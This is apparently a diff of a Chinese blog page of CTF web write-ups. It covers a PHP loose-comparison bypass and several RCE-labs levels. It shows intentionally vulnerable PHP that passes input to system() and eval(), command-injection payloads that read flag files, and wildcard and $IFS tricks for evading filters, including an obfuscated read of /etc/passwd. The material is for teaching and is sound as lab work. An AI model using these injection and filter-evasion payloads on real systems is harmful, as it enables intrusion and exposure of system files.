-</span></span></code></pre></div><p>所以如果字符长度进一步限制的话,就可以使用<code>/dev/fd</code>来读文件了.</p><h4 id=青岑web入门ezphp_2>青岑/web入门/ezphp_2</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;flag.php&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;qc&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;qc&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;no&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=nv>$qc</span> <span class=o>=</span> <span class=p>(</span><span class=k>array</span><span class=p>)</span><span class=nx>json_decode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;qc&#39;</span><span class=p>],</span> <span class=k>true</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$qc</span><span class=p>[</span><span class=s2>&#34;n&#34;</span><span class=p>])</span> <span class=o>||</span> <span class=o>!</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$qc</span><span class=p>[</span><span class=s2>&#34;n&#34;</span><span class=p>])</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$qc</span><span class=p>[</span><span class=s2>&#34;n&#34;</span><span class=p>]))</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>array_search</span><span class=p>(</span><span class=s2>&#34;QCCTF&#34;</span><span class=p>,</span> <span class=nv>$qc</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no...&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>array_search</span><span class=p>(</span><span class=s2>&#34;QCyyds&#34;</span><span class=p>,</span> <span class=nv>$qc</span><span class=p>[</span><span class=s2>&#34;n&#34;</span><span class=p>])</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no...&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$qc</span><span class=p>[</span><span class=s2>&#34;n&#34;</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$val</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$val</span> <span class=o>===</span> <span class=s2>&#34;QCyyds&#34;</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no......&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
-</span></span></code></pre></div><p>代码逻辑分析</p><p>我们要拿到 <code>$flag</code>，必须依次绕过以下几个检查：</p><ol><li>存在且非空：<code>qc</code> 参数必须存在且不能是空字符串。</li><li>JSON 解码与结构：<code>qc</code> 必须是一个合法的 JSON 字符串，解码后必须包含键 <code>"n"</code>，且 <code>"n"</code> 的值必须是一个非空数组。</li><li>顶层查找 &ldquo;QCCTF&rdquo;：<code>array_search("QCCTF", $qc) === false</code> 会返回假（即必须找到）。这意味着在 <code>$qc</code> 这个数组中，必须有一个值等于 <code>"QCCTF"</code>。</li><li>内层查找 &ldquo;QCyyds&rdquo;：<code>array_search("QCyyds", $qc["n"]) === false</code> 同理，在 <code>$qc["n"]</code> 数组中，必须有一个值等于 <code>"QCyyds"</code>。</li><li>严格排除 &ldquo;QCyyds&rdquo;：<code>foreach</code> 循环检查 <code>$qc["n"]</code> 中不能存在全等于 (<code>===</code>) 字符串 <code>"QCyyds"</code> 的元素。</li></ol><p>这里的关键在于 <code>array_search()</code> 函数。在 PHP 中，<code>array_search()</code> 默认使用的是松散比较 (<code>==</code>)。</p><p>在 PHP 松散比较中，任何字符串与数字 <code>0</code> 比较时，字符串会被强制转换为数字。而非数字开头的字符串（如 <code>"QCCTF"</code>, <code>"QCyyds"</code>）转换成数字后就是 <code>0</code>。</p><p>因此：</p><ul><li><code>0 == "QCCTF"</code> 结果为 True</li><li><code>0 == "QCyyds"</code> 结果为 True</li></ul><p>但是，全等于比较时类型不同：</p><ul><li><code>0 === "QCyyds"</code> 结果为 False</li></ul><p>根据以上分析，我们可以用整数 <code>0</code> 来代替字符串，完美绕过所有的 <code>array_search</code> 和 <code>foreach</code> 限制。</p><p>我们需要构造的 PHP 数组结构如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$qc</span> <span class=o>=</span> <span class=p>[</span>
-</span></span><span class=line><span class=cl>    <span class=s2>&#34;n&#34;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=mi>0</span><span class=p>],</span>  <span class=c1>// &#34;n&#34; 是一个包含 0 的数组。0 == &#34;QCyyds&#34; 为真，但 0 === &#34;QCyyds&#34; 为假。
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=s2>&#34;x&#34;</span> <span class=o>=&gt;</span> <span class=mi>0</span>     <span class=c1>// 随便给一个顶层键，值为 0，用于绕过 0 == &#34;QCCTF&#34;。
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>];</span>
-</span></span></code></pre></div><p>将这个数组转为 JSON 字符串：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;n&#34;</span><span class=p>:[</span><span class=mi>0</span><span class=p>],</span><span class=nt>&#34;x&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>}</span>
-</span></span></code></pre></div><p>将这个 JSON 字符串作为 <code>qc</code> 参数的值发送</p><p>最终 GET 请求：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>?qc={&#34;n&#34;:[0],&#34;x&#34;:0}
-</span></span></code></pre></div><p>当你传入 <code>?qc={"n":[0],"x":0}</code> 时：</p><ol><li><code>isset($_GET['qc'])</code> 为真，非空，继续。</li><li><code>json_decode</code> 解析成功，<code>$qc["n"]</code> 是数组 <code>[0]</code>，非空，继续。</li><li><code>array_search("QCCTF", $qc)</code>：在 <code>$qc</code> 的值（<code>[0]</code> 和 <code>0</code>）中找 <code>"QCCTF"</code>。因为 <code>0 == "QCCTF"</code> 为真，找到了，返回键名，不等于 <code>false</code>，继续。</li><li><code>array_search("QCyyds", $qc["n"])</code>：在 <code>$qc["n"]</code> 的值（<code>0</code>）中找 <code>"QCyyds"</code>。因为 <code>0 == "QCyyds"</code> 为真，找到了，返回键名 0，不等于 <code>false</code>，继续。</li><li><code>foreach</code> 循环：检查 <code>$qc["n"]</code> 中的元素 <code>0</code> 是否 <code>=== "QCyyds"</code>。因为 <code>0 === "QCyyds"</code> 为假，不退出，继续。</li><li>成功走到 <code>echo $flag;</code></li></ol></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/redos%E5%8F%8Aphp%E6%AD%A3%E5%88%99%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/><div class=article-details><h2 class=article-title>ReDos及PHP正则回溯绕过学习</h2></div></a></article><article><a href=/p/n1ctf2025-n1cat1/3/><div class=article-details><h2 class=article-title>N1CTF2025 n1cat(1/3)</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
-2024 -
-2026 Oight</section><section class=powerby>Build by Oight<br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-<button class="pswp__button pswp__button--share" title=Share></button>
-<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-</button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>(function(){const t=420;function e(){document.querySelectorAll(".article-content .highlight").forEach(function(e){if(e.dataset.codeFoldInit==="true")return;if(e.dataset.codeFoldInit="true",e.scrollHeight<=t+40)return;const s=document.createElement("div");s.className="code-fold-wrapper",e.parentNode.insertBefore(s,e),s.appendChild(e),e.classList.add("code-collapsible","code-collapsed");const n=document.createElement("button");n.type="button",n.className="code-toggle-button",n.textContent="展开代码",n.setAttribute("aria-expanded","false"),n.addEventListener("click",function(){const t=e.classList.toggle("code-collapsed");n.textContent=t?"展开代码":"收起代码",n.setAttribute("aria-expanded",String(!t))}),s.appendChild(n)})}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",e):e()})()</script></body></html>
+拥有了入门的工具，就可以步入WEB的世界力（喜）</p>
+<h3 id="web包括哪些内容">WEB包括哪些内容：
+</h3><p>1.文件包含
+2.文件上传</p></blockquote>
+<blockquote>
+<p>[!NOTE]</p>
+<p>更新：2026年3月8日</p></blockquote>
+<p>慢慢意识到自己当初基础非常的薄弱，以前也没怎么好好刷题</p>
+<p>这个博客用来记录从零开始学web的做题记录</p>
+<h3 id="ctf-show">CTF show
+</h3><h4 id="web签到题">web签到题
+</h4><p>F12 查看前端，在HTML中看到base64加密的flag</p>
+<h4 id="rce-labs-level4">RCE-labs-level4
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">&amp;&amp;（逻辑与运算符）: 只有当第一个命令 cmd_1 执行成功（返回值为 0）时，才会执行第二个命令 cmd_2。例:  mkdir test &amp;&amp; cd test
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">||（逻辑或运算符）: 只有当第一个命令 cmd_1 执行失败（返回值不为 0）时，才会执行第二个命令 cmd_2。例:  cd nonexistent_directory || echo &#34;Directory not found&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">&amp;（后台运行符）: 将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行。例:  sleep 10 &amp; echo &#34;This will run immediately.&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">;（命令分隔符）: 无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2。例:  echo &#34;Hello&#34; ; echo &#34;World&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_server</span><span class="p">(</span><span class="nv">$ip</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;ping -c 1 </span><span class="si">$ip</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_server</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>在这道题中，默认只有传递 ip||ls 可以成功执行，原因是 Payload在到达服务器并最终执行的过程中，经过了HTTP 解析层 和 Linux Shell 逻辑层 的双重处理，在 URL 中，&amp; 符号有着特殊含义，它是不同 GET 参数之间的分隔符，所以在传递的时候必须将&amp;进行URL编码才能执行成功，；同理。</p>
+<h4 id="rce-labs-level5">RCE-labs-level5
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">在Shell中，单/双引号 &#34;/&#39; 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。
+</span></span></span><span class="line"><span class="cl"><span class="cm">例如：echo &#34;$&#34;a 会输出 $a，而 echo $a 会输出变量a的值，当只有&#34;&#34;则表示空字符串，Shell会忽略它。
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*（星号）: 匹配零个或多个字符。例子: *.txt。
+</span></span></span><span class="line"><span class="cl"><span class="cm">?（问号）: 匹配单个字符。例子: file?.txt。
+</span></span></span><span class="line"><span class="cl"><span class="cm">[]（方括号）: 匹配方括号内的任意一个字符。例子: file[1-3].txt。
+</span></span></span><span class="line"><span class="cl"><span class="cm">[^]（取反方括号）: 匹配不在方括号内的字符。例子: file[^a-c].txt。
+</span></span></span><span class="line"><span class="cl"><span class="cm">{}（大括号）: 匹配大括号内的任意一个字符串。例子: file{1,2,3}.txt。
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">通过组合上述技巧，我们可以用于绕过CTF中一些简单的过滤：
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">system(&#34;c&#39;&#39;at /e&#39;t&#39;c/pass?d&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="cm">system(&#34;/???/?at /e&#39;t&#39;c/pass?d&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="cm">system(&#34;/???/?at /e&#39;t&#39;c/*ss*&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="cm">...
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;WAF!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_shell</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>payload: <code>?cmd=cat /f*</code></p>
+<h4 id="rce-labs-level6">RCE-labs-level6
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[b-zA-Z_@#%^&amp;*:{}\-\+&lt;&gt;</span><span class="se">\&#34;</span><span class="s2">|`;\[\]]/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;WAF!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_shell</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>这道题可以用上面的通配符进行绕过，可以看到这里过滤了除了字母a和数字以外所有的大小写字母，没过滤<code>/</code> 所以可以<code>cmd=/???/?a? /??a?</code> 用于匹配根目录下三个字符的目录（如 <code>/bin</code>、<code>/etc</code>）中，文件名长度为三个字符且中间字符为 <code>a</code> 的文件，常见的有 <code>/bin/cat</code>、<code>/bin/tar</code>、<code>/bin/man</code> 等。</p>
+<p>/??a?：匹配根目录下四个字符的文件名，且第三个字符为 a，即/flag，用这个会输出很多其他的东西；</p>
+<p>也可以使用<code>/???/?a??64 /??a?</code>，即/bin/base64 /flag这个能只匹配到/flag，然后使用base64输出</p>
+<p>/bin 目录是存放系统启动和单用户模式下必需的核心可执行文件，这些文件对所有用户（包括普通用户和 root）都可用，包含最基础的命令，如 <code>ls</code>（列出目录）、<code>cp</code>（复制文件）、<code>mv</code>（移动文件）、<code>sh</code>（Shell 解释器）等。</p>
+<h4 id="rce-labs-level7">RCE-labs-level7
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag| /&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;WAF!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_shell</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><code>payload</code> : <code>?cmd=cat$IFS/f*</code></p>
+<h4 id="rce-labs-level2">RCE-labs-level2
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="p">(</span><span class="s2">&#34;get_flag.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span> <span class="c1">// 开启 session
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 回调函数 也可以直接或者间接的执行PHP代码。
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_ctf</span><span class="p">(</span><span class="nv">$function</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$function</span> <span class="o">.</span> <span class="s2">&#34;(&#34;</span> <span class="o">.</span> <span class="nv">$content</span> <span class="o">.</span> <span class="s2">&#34;);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Your Code: </span><span class="si">$code</span><span class="s2"> &lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get_fun</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$func_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;assert&#39;</span><span class="p">,</span><span class="s1">&#39;call_user_func&#39;</span><span class="p">,</span><span class="s1">&#39;create_function&#39;</span><span class="p">,</span><span class="s1">&#39;array_map&#39;</span><span class="p">,</span><span class="s1">&#39;call_user_func_array&#39;</span><span class="p">,</span><span class="s1">&#39;usort&#39;</span><span class="p">,</span><span class="s1">&#39;array_filter&#39;</span><span class="p">,</span><span class="s1">&#39;array_reduce&#39;</span><span class="p">,</span><span class="s1">&#39;preg_replace&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;random_func&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;random_func&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$func_list</span><span class="p">[</span><span class="nx">array_rand</span><span class="p">(</span><span class="nv">$func_list</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nv">$random_func</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;random_func&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$url_fucn</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/_/&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;random_func&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;获得新的函数: </span><span class="si">$random_func</span><span class="s2"> ，去 https://www.php.net/manual/zh/function.&#34;</span><span class="o">.</span><span class="nv">$url_fucn</span><span class="o">.</span><span class="s2">&#34;.php 查看函数详情。&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;random_func&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">start</span><span class="p">(</span><span class="nv">$act</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$random_func</span> <span class="o">=</span> <span class="nx">get_fun</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">){</span> <span class="cm">/* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">session_unset</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">session_destroy</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
